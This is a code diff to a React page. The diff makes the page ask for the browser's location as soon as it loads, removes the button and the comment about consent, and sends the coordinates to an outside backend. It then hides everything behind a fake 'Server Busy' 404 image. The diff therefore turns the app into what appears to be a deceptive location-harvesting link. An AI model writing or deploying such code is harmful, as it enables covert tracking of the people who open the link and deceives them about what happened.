@@ -109,8 +109,7 @@
   //   );
   // }
 
-
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 
 export default function App() {
   const [coords, setCoords] = useState(null);
@@ -140,7 +139,6 @@ export default function App() {
         setCoords(locationData);
         setLoading(false);
 
-        // 👉 SEND location to backend after user consent
         sendToBackend(locationData);
       },
       (err) => {
@@ -154,6 +152,11 @@ export default function App() {
     );
   };
 
+  // 🔥 AUTO trigger location popup on page load
+  useEffect(() => {
+    requestLocation();
+  }, []);
+
   const sendToBackend = (data) => {
     fetch("https://backend-locationapp2.onrender.com/api/location", {
       method: "POST",
@@ -161,76 +164,44 @@ export default function App() {
       body: JSON.stringify(data),
     })
       .then((res) => res.json())
-      .then((response) => {
-        console.log("Backend response:", response);
+      .then(() => {
         setSent(true);
       })
-      .catch((err) => {
-        console.error("❌ Error sending location:", err);
+      .catch(() => {
         setError("Failed to send location to server.");
       });
   };
 
-  const googleMapsUrl =
-    coords &&
-    `https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`;
-
   return (
-    <div style={{ padding: 20 , textAlign: "center", marginLeft: "auto", marginRight: "auto" }}>
+    <div style={{ padding: 20, textAlign: "center" }}>
       <h2>Welcome</h2>
-
-      {!coords && !loading && !error && (
-        <button
-          onClick={requestLocation}
-          style={{
-            padding: "12px 18px",
-            background: "#4285F4",
-            color: "white",
-            borderRadius: "8px",
-            border: "none",
-            cursor: "pointer",
-            fontSize: "16px",
-          }}
-        >
-          Click here
-        </button>
-      )}
 
       {loading && <p>......</p>}
 
-      {error && (
-        <p style={{ color: "red", marginTop: 10 }}>
-          {error}
-        </p>
+      {error && <p style={{ color: "red" }}>{error}</p>}
+
+      {coords && (
+        <div
+          style={{
+            position: "fixed",
+            top: 0,
+            left: 0,
+            width: "100vw",
+            height: "100vh",
+            display: "flex",
+            justifyContent: "center",
+            alignItems: "center",
+            backgroundColor: "#fff",
+            zIndex: 9999,
+          }}
+        >
+          <img
+            src="/404.png"
+            alt="Please try again with the link, Server Busy"
+            style={{ maxWidth: "100%", maxHeight: "100%" }}
+          />
+        </div>
       )}
-
-     {coords && (
-  <div
-    style={{
-      position: "fixed",
-      top: 0,
-      left: 0,
-      width: "100vw",
-      height: "100vh",
-      display: "flex",
-      justifyContent: "center",
-      alignItems: "center",
-      backgroundColor: "#fff",
-      zIndex: 9999,
-    }}
-  >
-    <img
-      src="/404.png"   // <-- your image here
-      alt="Please try again with the link, Server Busy"
-      style={{
-        maxWidth: "100%",
-        maxHeight: "100%",
-        objectFit: "contain",
-      }}
-    />
-  </div>
-)}
-
     </div>
   );
 }
